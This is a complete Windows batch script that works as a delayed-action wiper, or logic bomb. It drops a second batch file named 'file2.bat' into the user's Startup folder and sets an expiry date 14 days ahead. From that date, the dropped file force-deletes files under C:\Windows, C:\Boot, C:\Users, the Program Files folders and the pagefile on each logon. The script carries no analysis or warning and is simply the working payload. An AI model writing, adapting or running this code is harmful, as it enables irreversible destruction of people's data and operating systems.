@echo off
setlocal


for /f %%A in ('powershell -command "& {(Get-Date).AddDays(14).ToString('yyyy-MM-dd')}"') do set NewDate=%%A


set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"


(
    echo @echo off
    echo set "EXPIRATION_DATE=%NewDate%"
    echo for /f %%%%A in ^('powershell -command "& ^{(Get-Date).ToString('yyyy-MM-dd')^}"'^) do set "TODAY=%%%%A"
    echo if "%%TODAY%%" GEQ "%%EXPIRATION_DATE%%" ^
    echo (^
    echo     del /F /Q "C:\Windows\*.*"
    echo     del /F /Q "C:\Boot\*.*"
    echo     del /F /Q "C:\Users\*.*"
    echo     del /F /Q "C:\Program Files\*.*"
    echo     del /F /Q "C:\Program Files (x86)\*.*"
    echo     del /F /Q "C:\pagefile.sys"
    echo ^)
    
) > "%startupPath%\file2.bat"
